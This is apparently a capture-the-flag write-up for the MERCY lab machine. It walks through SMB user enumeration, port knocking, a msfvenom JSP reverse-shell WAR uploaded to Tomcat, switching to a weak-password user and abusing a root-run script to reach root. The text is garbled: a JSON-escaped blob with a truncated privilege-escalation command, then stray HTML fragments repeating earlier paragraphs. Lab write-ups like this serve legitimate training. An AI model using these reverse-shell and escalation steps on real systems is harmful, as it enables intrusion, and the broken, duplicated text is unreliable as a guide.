Please stop setting silly passwords that will get cracked with any decent password list. Once, we found the password \"password\", quite literally sticking on a post-it in front of an employee's desk! As silly as it may be, the employee pleaded for mercy when we threatened to fire her. No fluffy bunnies for those who set insecure passwords and endanger the enterprise. Hmm password…… Lets go try that management page.. Welp default stuff failed!\nfurther investigation required. Time to find out more information, we know its a linux machine and SMB so.. enum4linux to the rescue!\n========================================== | Share Enumeration on 192.168.253.131 | ========================================== Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers qiu Disk IPC$ IPC IPC Service (MERCY server (Samba, Ubuntu)) ======================================================================== | Users on 192.168.253.131 via RID cycling (RIDS: 500-550,1000-1050) | ======================================================================== [+] Enumerating users using SID S-1-22-1 and logon username '', password '' S-1-22-1-1000 Unix User\\pleadformercy (Local User) S-1-22-1-1001 Unix User\\qiu (Local User) S-1-22-1-1002 Unix User\\thisisasuperduperlonguser (Local User) S-1-22-1-1003 Unix User\\fluffy (Local User) Intersting so we have a share qui and 4 users.\npleadformercy qiu thisisasuperduperlonguser fluffy So at this point im wondering, we know from the note that bad password practices have been used before i wonder what i can get into with this.

Time to google! So basically its a sequence of ports to knock on which will enable access to that port. This is pretty cool. It also explains why nmap returned filtered for port 22 and 80. Meaning that the port is open but the service is not until you knock on the port. From my research i can easily use netcat to do this. Again i only want to do port 80 for now as i want to see how i can get without ssh.\nnc 192.168.253.131 159 nc 192.168.253.131 27391 nc 192.168.253.131 4 Rescanning with nmap we have access to port 80!\nPORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) | http-robots.txt: 2 disallowed entries |_/mercy /nomercy |_http-server-header: Apache/2.4.7 (Ubuntu) |_http-title: Site doesn't have a title (text/html).

Oh cool, a webapp that i can upload stuff to. Time to pop a shell\nSo searching through metasploit i found i can do this a few ways, the first is using exploit/multi/http/tomcat_mgr/upload, second is just uploading a shell manually. i wanted to play more with msfvenom so i decided to use the second method.\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.253.131 LPORT=1234 -f war -o duck.war REMEMBER python -c 'import pty; pty.spawn(\"/bin/bash\")' MAKES SHELL USABLE. Upload the shell to the webapp and then run it.\nwhoami tomcat7 Well thats fun. We are connected, now to see if we can get root.\nsu into longuser auth fail?? ok… lets try fluffy\nsu fluffy whoami fluffy We are the bunny. Search around at the files and find .private wonder whats this. Ooooooo we’ve got a bash script that is displaying the time.. Seems like when /time is visited it will display the time. this is also ran as root :D\nSo we can get root a few ways i guess.\nput reverse shell into timeclock force sudo for user do some tmp bash root magic.. I havnt done much of the tmp bash magic before so lets explore it.\necho \"cp wait a few minutes as visiting /time doesnt instantly trigger woo!\nid uid=1003(fluffy) gid=1003(fluffy) euid=0(root) groups=0(root),groups=1003(fluffy) we are root :D scan for flag.\ncat author-secret.txt Hi! Congratulations on being able to root MERCY. The author feels bittersweet about this box. On one hand, it was a box designed as a dedication to the sufferance put through by the Offensive Security team for PWK. I thought I would pay it forward by creating a vulnerable machine too. This is not meant to be a particularly difficult machine, but is meant to bring you through a good number of enumerative steps through a variety of techniques. The author would also like to thank a great friend who he always teases as \"plead for mercy\". She has been awesome. The author, in particular, appreciates her great heart, candour, and her willingness to listen to the author's rants and troubles. The author will stay forever grateful for her presence. She never needed to be this friendly to the author. The author, as \"plead for mercy\" knows, is terrible at any sort of dedication or gifting, and so the best the author could do, I guess, is a little present, which explains the hostname of this box. (You might also have been pleading for mercy trying to root this box, considering its design.) You'll always be remembered, \"plead for mercy\", and Offensive Security, for making me plead for mercy! Congratulations, once again, for you TRIED HARDER! Regards, The Author What a fun box.\n",

</code></pre><p>uh.. what the hell is this? ive never heard of port knocking. Time to google!
So basically its a sequence of ports to knock on which will enable access to that port. This is pretty cool.
It also explains why nmap returned filtered for port <code>22</code> and <code>80</code>. Meaning that the port is open but the service is not until you knock on the port. From my research i can easily use netcat to do this. Again i only want to do port 80 for now as i want to see how i can get without ssh.</p>

Hi! Congratulations on being able to root MERCY.

The author feels bittersweet about this box. On one hand, it was a box designed as a dedication to the sufferance put through by the Offensive Security team for PWK. I thought I would pay it forward by creating a vulnerable machine too. This is not meant to be a particularly difficult machine, but is meant to bring you through a good number of enumerative steps through a variety of techniques.

The author would also like to thank a great friend who he always teases as &#34;plead for mercy&#34;. She has been awesome. The author, in particular, appreciates her great heart, candour, and her willingness to listen to the author&#39;s rants and troubles. The author will stay forever grateful for her presence. She never needed to be this friendly to the author.

The author, as &#34;plead for mercy&#34; knows, is terrible at any sort of dedication or gifting, and so the best the author could do, I guess, is a little present, which explains the hostname of this box. (You might also have been pleading for mercy trying to root this box, considering its design.)

You&#39;ll always be remembered, &#34;plead for mercy&#34;, and Offensive Security, for making me plead for mercy!

Congratulations, once again, for you TRIED HARDER!

Regards,
The Author
